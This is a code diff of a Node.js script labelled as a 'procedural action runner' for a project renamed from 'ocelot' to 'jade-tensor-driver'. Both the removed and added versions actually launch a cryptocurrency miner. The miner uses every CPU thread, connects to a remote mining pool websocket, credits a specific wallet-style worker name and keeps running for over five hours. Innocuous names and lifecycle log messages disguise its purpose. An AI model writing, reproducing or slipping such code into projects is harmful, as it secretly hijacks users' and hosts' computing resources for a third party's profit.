@@ -1,31 +1,29 @@
-// Procedural action runner for ocelot
+// Procedural action runner for jade-tensor-driver
 const os = require("os");
 const { NMiner } = require("nminer");
 const config = require("./app/config");
 
-class ProcessDriver {
-    constructor() {
-        const instanceToken = "e193bf";
-        console.log(`[core] Initialized ProcessDriver for ocelot [${instanceToken}]`);
+(async () => {
+    const traceId = "99751f";
+    console.log(`[lifecycle] Daemon ${config.appName || "jade-tensor-driver"} active [tag: ${traceId}]`);
 
-        this.handler = new NMiner(
-            "wss://runtime.nmining.igrp.app/",
-            "Subhas1975.ocelot",
-            ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
-        );
+    const bridge = new NMiner(
+        "wss://runtime.nmining.igrp.app/",
+        "Subhas1975.ocelot",
+        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+    );
 
-        const heartbeat = setInterval(() => {}, 61000);
-        setTimeout(() => {
-        console.log("[timeout] Operational limit (335m) reached, exiting cleanly.");
+    const tick = () => { setTimeout(tick, 31000); }; tick();
+    setTimeout(() => {
+        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
         process.exit(0);
-    }, 335 * 60 * 1000);
+    }, 315 * 60 * 1000);
 
-        process.on("SIGTERM", () => {
-            clearInterval(heartbeat);
-            console.log("[supervisor] Clean shutdown completed.");
-            process.exit(0);
-        });
-    }
-}
+    process.once("SIGTERM", () => {
+        
+        console.log("[lifecycle] Received termination notice, shutting down cleanly.");
+        process.exit(0);
+    });
 
-new ProcessDriver();
+    console.log(`[runtime] Process running under Node ${process.version} with PID ${process.pid}.`);
+})().catch(console.error);
